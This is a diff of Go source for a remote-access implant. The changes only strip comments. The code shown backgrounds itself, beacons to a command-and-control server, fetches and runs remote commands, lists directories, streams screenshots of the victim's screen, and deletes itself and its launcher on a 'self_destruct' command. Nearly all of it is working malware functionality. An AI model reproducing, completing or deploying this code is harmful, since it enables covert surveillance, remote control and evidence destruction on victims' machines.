@@ -155,7 +155,7 @@ func main() {
 		if relaunchErr != nil {
 			os.Exit(1)
 		}
-		os.Exit(0) // Initial launcher exits after successfully starting the backgrounded copy.
+		os.Exit(0)
 	}
 
 	os.Unsetenv(backgroundMarkerEnvVar)
@@ -170,9 +170,9 @@ func main() {
 	}
 
 	if doSelfDelete != nil {
-		// Start self-deletion process in background - delete both current executable and original launcher
+
 		go func() {
-			// Give the implant a moment to start up properly
+
 			time.Sleep(1 * time.Second)
 			doSelfDelete(exePath, gOriginalLauncherPath)
 		}()
@@ -180,7 +180,7 @@ func main() {
 
 	for {
 		checkIn()
-		// Pass current exePath (of this backgrounded process) AND the original launcher's path
+
 		fetchAndExecuteCommands(exePath, gOriginalLauncherPath)
 		time.Sleep(checkInInterval)
 	}
@@ -196,7 +196,7 @@ func checkIn() {
 	}
 	payload := CheckInPayload{
 		ImplantID: implantID(),
-		IPAddress: "", // IP can be obtained server-side
+		IPAddress: "",
 		PWD:       currentPwd,
 	}
 	jsonData, err := json.Marshal(payload)
@@ -269,12 +269,11 @@ func fetchAndExecuteCommands(currentImplantExePath string, originalLauncherPath 
 			if targetPath == "__ROOTS__" {
 				listing, listErr = listRoots()
 				if listErr != nil {
-					// If listRoots itself sets an error message in the listing, prefer that.
-					// Otherwise, use the error returned.
+
 					if listing.Error == "" {
 						listing.Error = fmt.Sprintf("Error listing roots: %v", listErr)
 					}
-					// Ensure RequestedPath is set for consistency, even in error cases from listRoots
+
 					if listing.RequestedPath == "" {
 						listing.RequestedPath = targetPath
 					}
@@ -282,18 +281,17 @@ func fetchAndExecuteCommands(currentImplantExePath string, originalLauncherPath 
 			} else {
 				listing, listErr = listDirectory(targetPath)
 				if listErr != nil {
-					// If listDirectory itself sets an error message in the listing, prefer that.
-					// Otherwise, use the error returned.
+
 					if listing.Error == "" {
 						listing.Error = fmt.Sprintf("Error listing directory '%s': %v", targetPath, listErr)
 					}
-					// Ensure RequestedPath is set for consistency
+
 					if listing.RequestedPath == "" {
 						listing.RequestedPath = targetPath
 					}
 				}
 			}
-			jsonOutput, _ := json.Marshal(listing) // Marshal the actual listing (or listing with error)
+			jsonOutput, _ := json.Marshal(listing)
 			sendOutput(cmdToExec.ID, string(jsonOutput))
 			continue
 		}
@@ -365,21 +363,16 @@ func fetchAndExecuteCommands(currentImplantExePath string, originalLauncherPath 
 			continue
 		}
 
-		// MODIFIED: self_destruct command now uses both paths
 		if trimmedCmdStr == "self_destruct" {
 			sendOutput(cmdToExec.ID, "Self-destruct sequence initiated. Implant and original launcher (if path known) will be targeted for deletion.")
 			if doSelfDelete != nil {
-				// currentImplantExePath is the path of THIS running executable (e.g., the one in Temp if relaunched)
-				// originalLauncherPath is the path of the initial .exe that was run
+
 				doSelfDelete(currentImplantExePath, originalLauncherPath)
-				// doSelfDelete has now initiated the deletion mechanisms (e.g., detached script, goroutine).
-				// The current process must exit to allow these mechanisms to delete the files.
+
 			}
-			// Always exit after attempting to initiate self-destruct.
-			// This allows the deletion mechanisms (like a detached script) to work on unlocked files.
-			// If doSelfDelete was nil, this simply terminates the implant.
+
 			os.Exit(0)
-			// The 'continue' statement below is now unreachable, which is expected.
+
 		}
 
 		if strings.HasPrefix(trimmedCmdStr, "cd ") {
@@ -463,13 +456,13 @@ func runLivestream(implantToken string, localStopChan <-chan struct{}) {
 				return
 			}
 			if takeScreenshot == nil {
-				isLivestreamActive = false // Stop livestream if capability is gone
-				// Consider logging this event or sending a status to C2
+				isLivestreamActive = false
+
 				return
 			}
 			outputBase64, err := takeScreenshot()
 			if err != nil {
-				continue // Skip frame on error
+				continue
 			}
 			sendLivestreamFrame(implantToken, outputBase64)
 
